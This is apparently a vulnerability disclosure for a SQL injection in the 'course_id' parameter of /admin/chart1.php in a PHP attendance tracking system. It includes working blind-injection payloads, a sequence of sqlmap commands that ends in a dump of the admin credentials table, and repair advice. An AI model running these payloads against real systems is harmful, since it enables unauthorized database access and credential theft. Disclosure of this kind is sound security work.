# 1000projects Attendance Tracking Management System PHP & MySQL Project V1.0 /admin/chart1.php SQL injection
# NAME OF AFFECTED PRODUCT(S)
+ Attendance Tracking Management System PHP & MySQL Project

## Vendor Homepage
+ [homepage](https://1000projects.org/attendance-tracking-management-system-php-mysql-project.html#google_vignette)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ takakie

## Vulnerable File
+ /admin/chart1.php

## VERSION(S)
+ V1.0

# Software Link
+ [Download Source Code](https://1000projects.org/wp-content/uploads/2022/04/Attendance-Tracking-Management-System.7z)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/admin/chart1.php' file of the 'Attendance Tracking Management System PHP & MySQL Project' project. The reason for this issue is that attackers inject malicious code from the parameter 'course_id' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION
+ During the security review of "Attendance Tracking Management System PHP & MySQL Project", takakie discovered a critical SQL injection vulnerability in the "/admin/chart1.php" file. This vulnerability stems from insufficient user input validation of the 'course_id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## ulnerability type:
+ boolean-based blind
+ time-based blind

## Vulnerability location:
+ 'course_id' parameter

## Payload:
```bash
---
Parameter: course_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: action=attendance_report&course_id=-1789' OR 6501=6501 OR 'RCNG'='VbrV&date=2024-12-05

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=attendance_report&course_id=2' AND (SELECT 9149 FROM (SELECT(SLEEP(5)))NFWc) OR 'DZWH'='qURN&date=2024-12-05
---
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```bash
sqlmap -u "192.168.10.5:2233/admin/chart1.php?action=attendance_report&course_id=2&date=2024-12-05" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --batch --level=5 --risk=3 --dbms=mysql
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738905879158-a27afab8-b4d3-4db5-8c43-88e7b68580a0.png)

```bash
sqlmap -u "192.168.10.5:2233/admin/chart1.php?action=attendance_report&course_id=2&date=2024-12-05" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --batch --level=5 --risk=3 --dbms=mysql --dbs
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738905918780-28033894-f35d-4448-b64a-4c696e476f2d.png)

```bash
sqlmap -u "192.168.10.5:2233/admin/chart1.php?action=attendance_report&course_id=2&date=2024-12-05" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --batch --dbms=mysql -D attendance --tables
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738906359815-1db99442-6792-4b53-b401-f036e3c316a1.png)

```bash
sqlmap -u "192.168.10.5:2233/admin/chart1.php?action=attendance_report&course_id=2&date=2024-12-05" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --batch --dbms=mysql -D attendance -T tbl_admin --columns
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738906346186-7117c1ff-29fe-48d5-a6c6-3d02df9e43f7.png)

```bash
sqlmap -u "192.168.10.5:2233/admin/chart1.php?action=attendance_report&course_id=2&date=2024-12-05" --cookie="PHPSESSID=l80tjseddr9a6vtiltdkocmspt" --batch --dbms=mysql -D attendance -T tbl_admin --dump
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738906414342-cd70b09c-6d13-4cf0-95d0-9de3bb456632.png)

| admin_id | admin_password | admin_user_name |
| --- | --- | --- |
| 1 | password | admin |
| 2 | password | admin123 |


true!!!

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1738906516282-94a5930b-3705-4ee4-b8a7-cb9e6d7b68a6.png)

# Suggested repair
1. Use prepared statements and parameter binding:  
Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. Input validation and filtering:  
Strictly validate and filter user input data to ensure it conforms to the expected format.
3. Minimize database user permissions:  
Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. Regular security audits:  
Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

